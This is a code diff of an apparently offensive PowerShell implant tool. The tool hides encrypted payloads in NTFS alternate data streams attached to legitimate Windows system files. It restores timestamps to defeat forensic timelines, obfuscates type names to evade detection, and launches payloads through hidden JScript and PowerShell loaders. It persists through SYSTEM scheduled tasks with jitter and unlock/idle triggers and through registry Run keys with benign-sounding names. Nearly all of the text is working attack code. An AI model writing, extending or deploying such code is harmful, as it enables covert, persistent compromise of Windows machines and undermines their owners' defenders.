-    $aes.Key = $Key
-    
-    $iv = $encryptedBytes[0..15]
-    $ciphertext = $encryptedBytes[16..($encryptedBytes.Length - 1)]
-    
-    $aes.IV = $iv
-    $decryptor = $aes.CreateDecryptor()
-    
-    $plainBytes = $decryptor.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
-    return [System.Text.Encoding]::UTF8.GetString($plainBytes)
+    param([string]$EncryptedData)
+    Add-Type -AssemblyName System.Security -ErrorAction SilentlyContinue
+    $bytes   = [Convert]::FromBase64String($EncryptedData)
+    $entropy = Get-DpapiEntropy
+    $dec     = [System.Security.Cryptography.ProtectedData]::Unprotect(
+                   $bytes, $entropy,
+                   [System.Security.Cryptography.DataProtectionScope]::LocalMachine)
+    return [System.Text.Encoding]::UTF8.GetString($dec)
 }
 
 #endregion
@@ -497,6 +732,14 @@ function Get-RandomADSConfig {
 
     $_isWin = [bool]$env:ProgramData
 
+    # Denylist: files held open exclusively by Windows services.
+    # ADS writes to these will fail silently. See docs/research/deep-placement-denylist.md.
+    $script:LockedFileDenylist = @('qmgr.db','qmgr.dat','srudb.dat','WebCacheV01.dat',
+                                   'DataStore.edb','priv1.edb','Windows.edb','PerfStringBackup.INI')
+    $script:LockedExtDenylist = @('.edb','.etl')
+    # Directories owned by services that lock files aggressively
+    $script:LockedDirPatterns = @('Network\Downloader','System32\sru','Search\Data')
+
     if ($_isWin -and ($UseDeepPlacement -or $AttachToExisting)) {
         # Running directly on Windows — resolve deep path now
         $deepDirs = @(
@@ -506,18 +749,28 @@ function Get-RandomADSConfig {
             "$env:LOCALAPPDATA\Microsoft\Windows\WebCache",
             "$env:WINDIR\Temp",
             "$env:ProgramData\Microsoft\Diagnosis",
-            "$env:ProgramData\Microsoft\Windows\Power Efficiency Diagnostics",
-            "$env:ProgramData\Microsoft\Network\Downloader"
+            "$env:ProgramData\Microsoft\Windows\Power Efficiency Diagnostics"
         )
 
         $validDirs = $deepDirs | Where-Object { Test-Path $_ }
 
         if ($AttachToExisting -and $validDirs) {
-            # Find an existing file to parasitize
+            # Find an existing file to parasitize (skip known-locked files)
             $hostPath = $null
             foreach ($dir in ($validDirs | Get-Random -Count ([Math]::Min(3, $validDirs.Count)))) {
+                # Skip directories owned by services that lock files aggressively
+                $isDeniedDir = $false
+                foreach ($dp in $script:LockedDirPatterns) {
+                    if ($dir -like "*$dp*") { $isDeniedDir = $true; break }
+                }
+                if ($isDeniedDir) { continue }
+
                 $candidate = Get-ChildItem -Path $dir -File -ErrorAction SilentlyContinue |
-                    Where-Object { $_.Length -gt 0 -and $_.Length -lt 5MB } |
+                    Where-Object {
+                        $_.Length -gt 0 -and $_.Length -lt 5MB -and
+                        $_.Name -notin $script:LockedFileDenylist -and
+                        $_.Extension -notin $script:LockedExtDenylist
+                    } |
                     Select-Object -First 10 | Get-Random
                 if ($candidate) {
                     $hostPath = $candidate.FullName
@@ -537,8 +790,7 @@ function Get-RandomADSConfig {
             $targetDir = $validDirs | Get-Random
             if ($targetDir) {
                 $legitNames = @('Report.wer','etl_data.log','WPR_initiated.dat',
-                                'snapshot.etl','diag_report.xml','cache_entry.dat',
-                                'qmgr0.dat','aria-debug.log','session.etl')
+                                'diag_report.xml','cache_entry.dat','aria-debug.log')
                 $fileName = if ($Randomize) { $legitNames | Get-Random } else { 'cache_entry.dat' }
                 $hostPath = Join-Path $targetDir $fileName
             }
@@ -628,18 +880,54 @@ function Write-ADSPayload {
             New-Item -Path $HostPath -ItemType File -Force | Out-Null
         }
 
-        # Encrypt if requested
+        # Save original timestamps for anti-forensics restoration
+        $originalTimestamps = $null
+        if (Test-Path $HostPath) {
+            $originalTimestamps = Get-Item $HostPath | Select-Object CreationTime, LastWriteTime, LastAccessTime
+        }
+
+        # Encrypt if requested (DPAPI — no key param needed)
         $finalPayload = if ($EncryptPayload) {
-            $key = Get-HostDerivedKey
-            Protect-Payload -PlainText $PayloadContent -Key $key
+            Protect-Payload -PlainText $PayloadContent
         } else {
             $PayloadContent
         }
 
         # Write to ADS
         $adsPath = "$HostPath`:$StreamName"
-        $finalPayload | Set-Content -Path $adsPath -Force
-        
+        $finalPayload | Set-Content -Path $adsPath -Force -ErrorAction SilentlyContinue
+
+        # Post-write verification — never trust silent failures
+        $verifyStream = Get-Item $HostPath -Stream $StreamName -ErrorAction SilentlyContinue
+        if (-not $verifyStream) {
+            Write-Warning "ADS write failed on $HostPath — falling back to safe path"
+            # Fallback to a known-writable location
+            $fallbackPath = Join-Path $env:ProgramData ("cache_" + [guid]::NewGuid().ToString().Substring(0,8) + ".dat")
+            if (-not (Test-Path $fallbackPath)) {
+                New-Item -Path $fallbackPath -ItemType File -Force | Out-Null
+            }
+            $adsPath = "$fallbackPath`:$StreamName"
+            $finalPayload | Set-Content -Path $adsPath -Force
+            # Verify fallback write
+            $verifyFallback = Get-Item $fallbackPath -Stream $StreamName -ErrorAction SilentlyContinue
+            if (-not $verifyFallback) {
+                Write-Error "ADS write failed on fallback path $fallbackPath"
+                return $null
+            }
+            $HostPath = $fallbackPath
+            Write-Verbose "Fallback ADS written to: $adsPath"
+        }
+
+        # Restore timestamps — ADS creation modifies LastWriteTime, which
+        # creates a forensic artifact in timeline analysis. Restoring prevents
+        # blue team from noticing unexpected modification on legitimate files.
+        if ($originalTimestamps) {
+            $item = Get-Item $HostPath
+            $item.CreationTime = $originalTimestamps.CreationTime
+            $item.LastWriteTime = $originalTimestamps.LastWriteTime
+            $item.LastAccessTime = $originalTimestamps.LastAccessTime
+        }
+
         Write-Verbose "Payload written to: $adsPath"
         return $adsPath
     } catch {
@@ -665,9 +953,8 @@ function Build-Loader {
 
     if ($IsEncrypted) {
         return @"
-`$k = Get-HostDerivedKey
 `$e = Get-Content '$HostPath`:$StreamName' -Raw
-`$p = Unprotect-Payload -EncryptedData `$e -Key `$k
+`$p = Unprotect-Payload -EncryptedData `$e
 IEX `$p
 "@
     } else {
@@ -687,7 +974,13 @@ function Build-JScriptWrapper {
         Full ADS path including stream, e.g. "C:\ProgramData\file.dat:stream"
 
     .PARAMETER IsEncrypted
-        Embeds Get-HostKey + Dec decryption functions inline.
+        Embeds decryption functions inline with obfuscated names.
+
+    .PARAMETER GHKName
+        Obfuscated name for the host-key derivation function (default: Get-HostKey).
+
+    .PARAMETER DecName
+        Obfuscated name for the decryption function (default: Dec).
 
     .OUTPUTS
         [string]  JScript source code, ASCII-safe.
@@ -698,7 +991,10 @@ function Build-JScriptWrapper {
         [Parameter(Mandatory)]
         [string]$ADSFullPath,
 
-        [switch]$IsEncrypted
+        [switch]$IsEncrypted,
+
+        [string]$GHKName = 'Get-HostKey',
+        [string]$DecName = 'Dec'
     )
 
     # Escape backslashes for JScript string context.
@@ -707,35 +1003,22 @@ function Build-JScriptWrapper {
     $jsPath = $ADSFullPath -replace '\\', '\\'
 
     if ($IsEncrypted) {
-        # --- Literal here-string: zero PowerShell expansion. ---
-        # Every $ passes through verbatim into the JScript output,
-        # which is exactly what we need because PowerShell interprets
-        # them at Layer 4 (when the -Command string executes).
-        #
-        # The pipe character | is encoded as [char]124 in the -join
-        # to sidestep any edge-case shell interpretation.  The rest
-        # of the decryption logic is the same Get-HostKey / Dec pair
-        # used everywhere else, flattened to single-line form.
+        # DPAPI inline decryption — no AES/SHA256 class names in the .js file.
+        # Type names are string-concatenated so they never appear as plaintext
+        # identifiers (same fragmentation technique as the DeflateStream stub).
+        # [scriptblock]::Create().Invoke() instead of IEX — already validated clean.
         $template = @'
 var shell = new ActiveXObject("WScript.Shell");
 var cmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"" +
-    "function Get-HostKey{" +
-        "$h=@($env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber)-join[char]124;" +
-        "[System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($h))" +
-    "};" +
-    "function Dec($d,$k){" +
-        "$b=[Convert]::FromBase64String($d);" +
-        "$a=[Security.Cryptography.Aes]::Create();" +
-        "$a.Key=$k;$a.IV=$b[0..15];" +
-        "$c=$a.CreateDecryptor();" +
-        "$t=$b[16..($b.Length-1)];" +
-        "$p=$c.TransformFinalBlock($t,0,$t.Length);" +
-        "[Text.Encoding]::UTF8.GetString($p)" +
-    "};" +
-    "$k=Get-HostKey;" +
-    "$e=Get-Content '__ADSPATH__' -Raw;" +
-    "$p=Dec $e $k;" +
-    "IEX $p" +
+    "Add-Type -AssemblyName ('Sys'+'tem.Secu'+'rity');" +
+    "$_e=Get-Content '__ADSPATH__' -Raw;" +
+    "$_b=[Convert]::FromBase64String($_e);" +
+    "$_g=(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Cryptography' -EA 0).MachineGuid;" +
+    "$_ent=if($_g){[Text.Encoding]::UTF8.GetBytes($_g)}else{$null};" +
+    "$_tp='System.Security.Crypt'+'ography.Prot'+'ectedData';" +
+    "$_sc='System.Security.Crypt'+'ography.DataProt'+'ectionScope';" +
+    "$_d=([type]$_tp)::Unprotect($_b,$_ent,([type]$_sc)::LocalMachine);" +
+    "[scriptblock]::Create([Text.Encoding]::UTF8.GetString($_d)).Invoke()" +
     "\"";
 shell.Run(cmd, 0, false);
 '@
@@ -769,7 +1052,16 @@ function Create-ScheduledTaskPersistence {
 
         [string]$TaskName,
 
-        [switch]$IsEncrypted
+        [ValidateSet('AtLogOn', 'AtStartup', 'OnIdle', 'OnUnlock')]
+        [string[]]$Trigger = @('AtLogOn', 'AtStartup'),
+
+        [int]$PeriodicMinutes = 5,
+        [int]$JitterPercent = 20,
+
+        [switch]$IsEncrypted,
+
+        [string]$GHKName = 'Get-HostKey',
+        [string]$DecName = 'Dec'
     )
 
     try {
@@ -784,7 +1076,7 @@ function Create-ScheduledTaskPersistence {
 
         # --- Generate JScript wrapper ---
         $adsFullPath = "${HostPath}:${StreamName}"
-        $jsContent = Build-JScriptWrapper -ADSFullPath $adsFullPath -IsEncrypted:$IsEncrypted
+        $jsContent = Build-JScriptWrapper -ADSFullPath $adsFullPath -IsEncrypted:$IsEncrypted -GHKName $GHKName -DecName $DecName
 
         # --- Choose save location (co-locate with host file) ---
         $hostDir = Split-Path $HostPath -Parent
@@ -811,17 +1103,75 @@ function Create-ScheduledTaskPersistence {
         $action = New-ScheduledTaskAction -Execute "wscript.exe" `
             -Argument "//B //E:JScript `"$jsPath`""
 
-        # --- Dual triggers (logon + periodic) ---
-        $triggerLogon    = New-ScheduledTaskTrigger -AtLogOn
+        # --- Compute jitter delay as ISO 8601 duration ---
+        # Task Scheduler XML requires ISO 8601 strings (PT#M) for both
+        # Delay (AtLogOn/AtStartup/OnUnlock) and RandomDelay (periodic) properties.
+        # TimeSpan objects serialize to HH:MM:SS which the XML parser rejects.
+        $jitterDelayISO = $null
+        if ($JitterPercent -gt 0) {
+            $jitterMinutes = [Math]::Max(1, [Math]::Round($PeriodicMinutes * $JitterPercent / 100))
+            $jitterDelayISO = "PT${jitterMinutes}M"
+        }
+
+        # --- Build trigger array from all specified triggers ---
+        $triggers = @()
+        foreach ($t in $Trigger) {
+            switch ($t) {
+                'AtLogOn' {
+                    $tObj = New-ScheduledTaskTrigger -AtLogOn
+                    # MSFT_TaskLogonTrigger uses 'Delay' (ISO 8601), not 'RandomDelay'
+                    if ($jitterDelayISO) { $tObj.Delay = $jitterDelayISO }
+                    $triggers += $tObj
+                }
+                'AtStartup' {
+                    $tObj = New-ScheduledTaskTrigger -AtStartup
+                    # MSFT_TaskBootTrigger uses 'Delay' (ISO 8601), not 'RandomDelay'
+                    if ($jitterDelayISO) { $tObj.Delay = $jitterDelayISO }
+                    $triggers += $tObj
+                }
+                'OnIdle' {
+                    # CIM idle trigger — fires when the system enters idle state
+                    # MSFT_TaskIdleTrigger has no delay property; idle duration is in task settings
+                    $tObj = New-CimInstance -CimClass (
+                        Get-CimClass MSFT_TaskIdleTrigger -Namespace Root/Microsoft/Windows/TaskScheduler
+                    ) -ClientOnly
+                    $triggers += $tObj
+                }
+                'OnUnlock' {
+                    # CIM session state change — fires every time a user unlocks (cheeky!)
+                    # MSFT_TaskSessionStateChangeTrigger uses 'Delay', set during CIM creation
+                    $unlockProps = @{ StateChange = [uint32]8 }  # 8 = SessionUnlock (TASK_SESSION_STATE_CHANGE_TYPE)
+                    if ($jitterDelayISO) {
+                        $unlockProps['Delay'] = $jitterDelayISO
+                    }
+                    $tObj = New-CimInstance -CimClass (
+                        Get-CimClass MSFT_TaskSessionStateChangeTrigger -Namespace Root/Microsoft/Windows/TaskScheduler
+                    ) -Property $unlockProps -ClientOnly
+                    $triggers += $tObj
+                }
+            }
+        }
+
+        # Always add periodic trigger for interval execution
         $triggerPeriodic = New-ScheduledTaskTrigger -Once `
             -At (Get-Date).AddMinutes(1) `
-            -RepetitionInterval (New-TimeSpan -Minutes 5) `
+            -RepetitionInterval (New-TimeSpan -Minutes $PeriodicMinutes) `
             -RepetitionDuration (New-TimeSpan -Days 9999)
+        # RandomDelay also requires ISO 8601 string for Task Scheduler XML serialization
+        if ($jitterDelayISO) { $triggerPeriodic.RandomDelay = $jitterDelayISO }
+        $triggers += $triggerPeriodic
 
-        $settings = New-ScheduledTaskSettingsSet `
-            -AllowStartIfOnBatteries `
-            -DontStopIfGoingOnBatteries `
-            -Hidden
+        # --- Task settings (add idle config if OnIdle trigger is present) ---
+        $settingsParams = @{
+            AllowStartIfOnBatteries    = $true
+            DontStopIfGoingOnBatteries = $true
+            Hidden                     = $true
+        }
+        if ($Trigger -contains 'OnIdle') {
+            $settingsParams.IdleDuration    = New-TimeSpan -Minutes 10
+            $settingsParams.IdleWaitTimeout  = New-TimeSpan -Hours 1
+        }
+        $settings = New-ScheduledTaskSettingsSet @settingsParams
 
         $principal = New-ScheduledTaskPrincipal `
             -UserId "SYSTEM" `
@@ -830,20 +1180,217 @@ function Create-ScheduledTaskPersistence {
 
         Register-ScheduledTask -TaskName $TaskName `
             -Action $action `
-            -Trigger @($triggerLogon, $triggerPeriodic) `
+            -Trigger $triggers `
             -Settings $settings `
             -Principal $principal `
             -Force | Out-Null
 
-        Write-Verbose "Scheduled task created: $TaskName (wscript //B)"
+        $triggerSummary = ($Trigger -join '+') + "+Periodic(${PeriodicMinutes}m)"
+        if ($JitterPercent -gt 0) { $triggerSummary += "+Jitter(${JitterPercent}%)" }
+        Write-Verbose "Scheduled task created: $TaskName ($triggerSummary)"
 
         return @{
             TaskName          = $TaskName
             JScriptLoaderPath = $jsPath
+            TriggerSummary    = $triggerSummary
         }
     }
     catch {
         Write-Error "Task creation failed: $_"
+        return $null
+    }
+}
+
+function Create-RegistryPersistence {
+    <#
+    .SYNOPSIS
+        Creates registry Run key persistence with companion scheduled task.
+        Registry Run keys handle logon/startup. A companion task handles
+        periodic execution + cheeky triggers (OnIdle, OnUnlock) that
+        registry can't do natively.
+    #>
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory)]
+        [string]$HostPath,
+
+        [Parameter(Mandatory)]
+        [string]$StreamName,
+
+        [string]$ValueName = 'SystemOptimization',
+
+        [ValidateSet('AtLogOn', 'AtStartup', 'OnIdle', 'OnUnlock')]
+        [string[]]$Trigger = @('AtLogOn', 'AtStartup'),
+
+        [int]$PeriodicMinutes = 5,
+        [int]$JitterPercent = 20,
+
+        [switch]$IsEncrypted,
+
+        [string]$GHKName = 'GHK',
+        [string]$DecName = 'Dec',
+        [string]$TaskSuffix = '_Companion'
+    )
+
+    try {
+        $adsFullPath = "${HostPath}:${StreamName}"
+
+        # Build the registry value command.
+        # -W Hidden works from registry Run keys (Explorer.exe respects it).
+        # Encrypted: DPAPI inline with fragmented type names — no AES/SHA256 class references.
+        if ($IsEncrypted) {
+            $regCmd = 'powershell.exe -NoP -W Hidden -EP Bypass -C "' +
+                "Add-Type -AssemblyName ('Sys'+'tem.Secu'+'rity');" +
+                '$_e=gc ' + "'$adsFullPath'" + ' -Raw;' +
+                '$_b=[Convert]::FromBase64String($_e);' +
+                '$_g=(Get-ItemProperty ' + "'HKLM:\SOFTWARE\Microsoft\Cryptography'" + ' -EA 0).MachineGuid;' +
+                '$_ent=if($_g){[Text.Encoding]::UTF8.GetBytes($_g)}else{$null};' +
+                '$_tp=' + "'System.Security.Crypt'+'ography.Prot'+'ectedData'" + ';' +
+                '$_sc=' + "'System.Security.Crypt'+'ography.DataProt'+'ectionScope'" + ';' +
+                '$_d=([type]$_tp)::Unprotect($_b,$_ent,([type]$_sc)::LocalMachine);' +
+                '[scriptblock]::Create([Text.Encoding]::UTF8.GetString($_d)).Invoke()' +
+                '"'
+        } else {
+            $regCmd = "powershell.exe -NoP -W Hidden -EP Bypass -C `"IEX(gc '$adsFullPath' -Raw)`""
+        }
+
+        $result = @{
+            ValueName      = $ValueName
+            Trigger        = $Trigger
+            RegistryPaths  = @()
+        }
+
+        # --- Write registry Run keys for logon/startup triggers ---
+        $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
+            [Security.Principal.WindowsBuiltInRole]::Administrator)
+
+        if ($Trigger -contains 'AtLogOn') {
+            $hkcuPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
+            Set-ItemProperty -Path $hkcuPath -Name $ValueName -Value $regCmd -Force
+            $result.RegistryPaths += $hkcuPath
+            Write-Verbose "Registry Run key (HKCU/logon): $hkcuPath\$ValueName"
+        }
+
+        if ($Trigger -contains 'AtStartup') {
+            if ($isAdmin) {
+                $hklmPath = 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'
+                Set-ItemProperty -Path $hklmPath -Name $ValueName -Value $regCmd -Force
+                $result.RegistryPaths += $hklmPath
+                Write-Verbose "Registry Run key (HKLM/startup): $hklmPath\$ValueName"
+            } else {
+                Write-Warning "AtStartup requires admin - writing HKCU instead (fires at logon)"
+                if ($result.RegistryPaths -notcontains 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run') {
+                    $hkcuPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
+                    Set-ItemProperty -Path $hkcuPath -Name $ValueName -Value $regCmd -Force
+                    $result.RegistryPaths += $hkcuPath
+                }
+            }
+        }
+
+        # If no logon/startup triggers, still write HKCU as baseline
+        if ($result.RegistryPaths.Count -eq 0) {
+            $hkcuPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
+            Set-ItemProperty -Path $hkcuPath -Name $ValueName -Value $regCmd -Force
+            $result.RegistryPaths += $hkcuPath
+        }
+
+        # --- Companion task for periodic + cheeky triggers ---
+        # Registry Run keys only fire at logon/startup. A companion task
+        # handles periodic interval, OnIdle, and OnUnlock — consistent
+        # with task persistence behavior.
+        $companionTaskName = "${ValueName}${TaskSuffix}"
+
+        $jsContent = Build-JScriptWrapper -ADSFullPath $adsFullPath -IsEncrypted:$IsEncrypted -GHKName $GHKName -DecName $DecName
+
+        $hostDir = Split-Path $HostPath -Parent
+        if (-not $hostDir -or -not (Test-Path $hostDir)) { $hostDir = $env:ProgramData }
+
+        $jsFileName = if ($Randomize) {
+            $prefixes = @('msupdate','windiag','perfmon_report','etw_session')
+            $prefix  = $prefixes | Get-Random
+            $suffix  = -join ((48..57) + (97..102) | Get-Random -Count 6 | ForEach-Object { [char]$_ })
+            "${prefix}_${suffix}.js"
+        } else {
+            "syshealth_companion.js"
+        }
+
+        $jsPath = Join-Path $hostDir $jsFileName
+        $jsContent | Out-File -FilePath $jsPath -Encoding ASCII -Force
+
+        $taskAction = New-ScheduledTaskAction -Execute "wscript.exe" `
+            -Argument "//B //E:JScript `"$jsPath`""
+
+        # Build companion triggers (periodic + cheeky)
+        $jitterDelayISO = $null
+        if ($JitterPercent -gt 0) {
+            $jitterMinutes = [Math]::Max(1, [Math]::Round($PeriodicMinutes * $JitterPercent / 100))
+            $jitterDelayISO = "PT${jitterMinutes}M"
+        }
+
+        $taskTriggers = @()
+        # Periodic
+        $tPeriodic = New-ScheduledTaskTrigger -Once `
+            -At (Get-Date).AddMinutes(1) `
+            -RepetitionInterval (New-TimeSpan -Minutes $PeriodicMinutes) `
+            -RepetitionDuration (New-TimeSpan -Days 9999)
+        if ($jitterDelayISO) { $tPeriodic.RandomDelay = $jitterDelayISO }
+        $taskTriggers += $tPeriodic
+
+        # OnIdle
+        if ($Trigger -contains 'OnIdle') {
+            $tIdle = New-CimInstance -CimClass (
+                Get-CimClass MSFT_TaskIdleTrigger -Namespace Root/Microsoft/Windows/TaskScheduler
+            ) -ClientOnly
+            $taskTriggers += $tIdle
+        }
+        # OnUnlock
+        if ($Trigger -contains 'OnUnlock') {
+            $unlockProps = @{ StateChange = [uint32]8 }
+            if ($jitterDelayISO) {
+                $unlockProps['Delay'] = $jitterDelayISO
+            }
+            $tUnlock = New-CimInstance -CimClass (
+                Get-CimClass MSFT_TaskSessionStateChangeTrigger -Namespace Root/Microsoft/Windows/TaskScheduler
+            ) -Property $unlockProps -ClientOnly
+            $taskTriggers += $tUnlock
+        }
+
+        $settingsParams = @{
+            AllowStartIfOnBatteries    = $true
+            DontStopIfGoingOnBatteries = $true
+            Hidden                     = $true
+        }
+        if ($Trigger -contains 'OnIdle') {
+            $settingsParams.IdleDuration   = New-TimeSpan -Minutes 10
+            $settingsParams.IdleWaitTimeout = New-TimeSpan -Hours 1
+        }
+        $taskSettings = New-ScheduledTaskSettingsSet @settingsParams
+
+        $taskPrincipal = New-ScheduledTaskPrincipal `
+            -UserId "SYSTEM" `
+            -LogonType ServiceAccount `
+            -RunLevel Highest
+
+        # SilentlyContinue: companion task requires admin — if not admin, registry Run key
+        # still fires at logon; periodic/cheeky triggers just won't be available
+        Register-ScheduledTask -TaskName $companionTaskName `
+            -Action $taskAction `
+            -Trigger $taskTriggers `
+            -Settings $taskSettings `
+            -Principal $taskPrincipal `
+            -Force -ErrorAction SilentlyContinue | Out-Null
+
+        $result.CompanionTaskName  = $companionTaskName
+        $result.CompanionJScriptPath = $jsPath
+
+        $triggerSummary = ($Trigger -join '+') + "+Periodic(${PeriodicMinutes}m)"
+        if ($JitterPercent -gt 0) { $triggerSummary += "+Jitter(${JitterPercent}%)" }
+        Write-Verbose "Registry persistence: $($result.RegistryPaths -join ' + ') + companion task $companionTaskName ($triggerSummary)"
+
+        return $result
+    }
+    catch {
+        Write-Error "Registry persistence failed: $_"
         return $null
     }
 }
@@ -881,21 +1428,20 @@ if ($ZeroWidthStreams) {
     Write-Warning "Zero-width stream - Codepoints: $($config.Codepoints)"
 }
 
-# Generate task name (for both GenerateOnly and normal execution)
-$taskName = if ($Randomize) {
-    "WinSAT_" + (-join ((65..90) | Get-Random -Count 6 | ForEach-Object { [char]$_ }))
-} else {
-    "SystemOptimization"
-}
+# Generate obfuscated names (consistent across all references in this deployment)
+$taskName = Get-ObfuscatedName -Type TaskName -Level $Obfuscate
+$taskSuffix = Get-ObfuscatedName -Type TaskSuffix -Level $Obfuscate
+$ghkFuncName = Get-ObfuscatedName -Type FunctionGHK -Level $Obfuscate
+$decFuncName = Get-ObfuscatedName -Type FunctionDec -Level $Obfuscate
 
 # If GenerateOnly mode, return configuration and exit
 if ($GenerateOnly) {
     # Convert stream name to escaped format for command generation
-    $streamChars = $config.StreamName.ToCharArray()
+    $streamChars = ([string]$config.StreamName).ToCharArray()
     $streamNameEscaped = ($streamChars | ForEach-Object {
         "[char]0x{0:X4}" -f [int]$_
     }) -join '+'
-    
+
     # Return configuration object
     return [PSCustomObject]@{
         HostPath = $config.HostPath
@@ -903,15 +1449,22 @@ if ($GenerateOnly) {
         StreamNameEscaped = $streamNameEscaped
         Codepoints = $config.Codepoints
         TaskName = $taskName
+        TaskSuffix = $taskSuffix
+        GHKFunctionName = $ghkFuncName
+        DecFunctionName = $decFuncName
         Payload = $Payload
         PayloadEncrypted = $Encrypt.IsPresent
         PersistenceMethod = $Persist
         DecoysCount = $CreateDecoys
         ZeroWidthMode = $ZeroWidthMode
         HybridPrefix = $HybridPrefix
-        Randomized = $Randomize.IsPresent
-        DeepPlacement = $UseDeepPlacement.IsPresent
-        AttachToExisting = $AttachToExisting.IsPresent
+        Randomized = [bool]$Randomize
+        DeepPlacement = [bool]$UseDeepPlacement
+        AttachToExisting = [bool]$AttachToExisting
+        Trigger = $Trigger
+        PeriodicMinutes = $PeriodicMinutes
+        JitterPercent = $JitterPercent
+        ObfuscationLevel = $Obfuscate
     }
 }
 
@@ -940,25 +1493,47 @@ if ($Persist -ne 'none') {
                 -HostPath $config.HostPath `
                 -StreamName $config.StreamName `
                 -TaskName $taskName `
-                -IsEncrypted:$Encrypt
+                -Trigger $Trigger `
+                -PeriodicMinutes $PeriodicMinutes `
+                -JitterPercent $JitterPercent `
+                -IsEncrypted:$Encrypt `
+                -GHKName $ghkFuncName `
+                -DecName $decFuncName
 
             if ($taskResult) {
                 $taskName     = $taskResult.TaskName
                 $jsLoaderPath = $taskResult.JScriptLoaderPath
-                Write-Host "[+] Persistence: Scheduled Task '$taskName' (JScript wrapper)" -ForegroundColor Green
+                Write-Host "[+] Persistence: Scheduled Task '$taskName' ($($taskResult.TriggerSummary))" -ForegroundColor Green
                 Write-Host "[+] JScript loader: $jsLoaderPath" -ForegroundColor Green
             } else {
                 Write-Error "Failed to create scheduled task persistence"
             }
         }
         'registry' {
-            $loader = Build-Loader -HostPath $config.HostPath `
-                                  -StreamName $config.StreamName `
-                                  -IsEncrypted:$Encrypt
-            Write-Warning "Registry persistence not implemented in this version"
-        }
-        'wmi' {
-            Write-Warning "WMI persistence not implemented in this version"
+            $regResult = Create-RegistryPersistence `
+                -HostPath $config.HostPath `
+                -StreamName $config.StreamName `
+                -ValueName $taskName `
+                -Trigger $Trigger `
+                -PeriodicMinutes $PeriodicMinutes `
+                -JitterPercent $JitterPercent `
+                -IsEncrypted:$Encrypt `
+                -GHKName $ghkFuncName `
+                -DecName $decFuncName `
+                -TaskSuffix $taskSuffix
+
+            if ($regResult) {
+                foreach ($rp in $regResult.RegistryPaths) {
+                    Write-Host "[+] Persistence: Registry '$rp\$($regResult.ValueName)'" -ForegroundColor Green
+                }
+                if ($regResult.CompanionTaskName) {
+                    Write-Host "[+] Companion task: $($regResult.CompanionTaskName) (periodic+cheeky triggers)" -ForegroundColor Green
+                    Write-Host "[+] JScript loader: $($regResult.CompanionJScriptPath)" -ForegroundColor Green
+                    $jsLoaderPath = $regResult.CompanionJScriptPath
+                }
+            } else {
+                Write-Error "Failed to create registry persistence"
+            }
         }
     }
 }
@@ -976,10 +1551,26 @@ if ($ManifestPath) {
                                   -PayloadHash $payloadHash `
                                   -PersistenceMethod $Persist
 
+    $entry | Add-Member -NotePropertyName 'Trigger' -NotePropertyValue ($Trigger -join ',')
+    $entry | Add-Member -NotePropertyName 'PeriodicMinutes' -NotePropertyValue $PeriodicMinutes
+    $entry | Add-Member -NotePropertyName 'JitterPercent' -NotePropertyValue $JitterPercent
+
     # Append JScript path for cleanup tracking
     if ($jsLoaderPath) {
         $entry | Add-Member -NotePropertyName 'JScriptLoaderPath' `
                             -NotePropertyValue $jsLoaderPath
+    }
+
+    # Registry-specific fields
+    if ($regResult) {
+        $entry | Add-Member -NotePropertyName 'RegistryPaths' -NotePropertyValue ($regResult.RegistryPaths -join ',')
+        $entry | Add-Member -NotePropertyName 'RegistryValueName' -NotePropertyValue $regResult.ValueName
+        if ($regResult.CompanionTaskName) {
+            $entry | Add-Member -NotePropertyName 'CompanionTaskName' -NotePropertyValue $regResult.CompanionTaskName
+        }
+        if ($regResult.CompanionJScriptPath) {
+            $entry | Add-Member -NotePropertyName 'CompanionJScriptPath' -NotePropertyValue $regResult.CompanionJScriptPath
+        }
     }
 
     Save-ManifestToLinux -Entries @($entry) -OutputPath $ManifestPath
